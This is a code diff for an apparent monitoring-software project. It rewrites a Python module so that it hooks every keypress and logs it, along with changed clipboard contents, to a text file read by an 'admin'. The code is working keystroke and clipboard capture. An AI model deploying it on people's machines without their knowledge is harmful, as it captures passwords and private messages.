@@ -1,7 +1,7 @@
 ########################################################################################################################
-#               Dit is het bestand voor de keystrokes en clipboard logger delen.                                       #
-#               Probeer zoveel mogelijk code in functies/classes te plaatsen i.p.v. los.                               #
-#               De code in dit bestand wordt geïmporteerd naar monitorings_software.py.                                #
+#               This file should only contain all the code related to the keylogger and clipboard logger.              #
+#               Try to keep the code as modular as possible by separating it into functions and classes.               #
+#               Code in this file should only be imported into monitorings_software.py.                                #
 #               - Keano (03-04-2023)                                                                                   #
 ########################################################################################################################
 
@@ -9,44 +9,43 @@
 import keyboard as kb
 import pyperclip as pc
 
+old_clipboard = None
+
+
 # Main code here
+def event_to_string(event):
+    if event.name == 'space':
+        string = ' '
+    elif event.name in kb.all_modifiers or event.name in ['tab', 'enter']:
+        string = f"[{event.name.upper()}]"
+    elif event.name != 'backspace':  # Should always be regular characters.
+        string = event.name
+    elif event.name == 'backspace':  # Separated from rest, to allow updates.
+        # TODO: make it easier for the admin to SEE backspaces instead of having to read them.
+        string = '[BACKSPACE]'
+    else:
+        print(event.name)  # Should never happen.
+        string = event.name
+
+    return string
 
 
-def copy_clipboard(text_file, old_clipboard, new_clipboard):
-    if old_clipboard != new_clipboard and new_clipboard is not None:
-        text_file.write(f"CLIPBOARD DATA: {new_clipboard} \n")
-        old_clipboard = new_clipboard
-    new_clipboard = pc.paste()
-    return old_clipboard, new_clipboard
+def start_keylogger(text_file):
+    def on_press(event):
+        text_file.write(event_to_string(event))
+    kb.on_press(on_press)
 
 
-class Keylogger:
-    def __init__(self):
-        self.is_recording = False
-        self.events_queue = []
-        self.relevant_keys = []
+def stop_keylogger():
+    kb.unhook_all()  # Despite this function being only 1 line, might be handy in case of future add-ons.
 
-    def start_keylogger_recording(self):
-        self.is_recording = True
-        kb.start_recording()
 
-    def stop_keylogger_recording(self):
-        self.is_recording = False
-        previous_events_queue = self.events_queue.copy()
-        self.events_queue = kb.stop_recording()
-        if len(previous_events_queue) > 0 and isinstance(previous_events_queue, list):
-            cut_off_value = len(previous_events_queue)
-            print(cut_off_value)
-            self.events_queue = self.events_queue[(cut_off_value-1):]
-        return self.events_queue
-
-    def get_down_keypresses(self, events_queue):
-        if len(events_queue) > 0:
-            self.relevant_keys.clear()
-            for event in events_queue:
-                if event.event_type == 'down':
-                    self.relevant_keys.append(event.name)
-            return self.relevant_keys
+def log_clipboard(text_file):
+    global old_clipboard
+    current_clipboard = pc.paste()
+    if current_clipboard != old_clipboard:
+        text_file.write(f" [CLIPBOARD DATA: {current_clipboard}] ")
+        old_clipboard = current_clipboard
 
 
 def main():
